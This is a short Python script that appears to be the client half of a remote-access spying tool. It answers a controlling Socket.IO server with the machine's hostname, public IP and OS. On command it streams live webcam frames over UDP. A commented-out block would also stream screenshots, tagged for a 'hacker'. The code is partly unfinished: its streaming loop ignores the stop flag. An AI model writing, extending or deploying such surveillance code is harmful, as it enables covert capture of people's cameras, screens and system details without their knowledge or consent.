from copyreg import pickle
import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np
import struct
import cv2
import pickle
from time import sleep
import imutils

sio = socketio.Client()

isRemotting = False

cap = cv2.VideoCapture(0)

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })

@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False

@sio.on('remote start')
def remoteStart():
  sleep(1)
  global isRemotting
  isRemotting = True

  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

  while True:
    ret, frame = cap.read()
    d = frame.flatten()
    s = d.tostring()

    for i in range(20):
      sock.sendto(s[i*46080:(i+1)*46080], ('localhost', 8001))

      if cv2.waitKey(1) & 0xFF == ord('q'):
        break

  # while isRemotting:
  #   screen = pyautogui.screenshot()
  #   src = np.array(screen)

  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')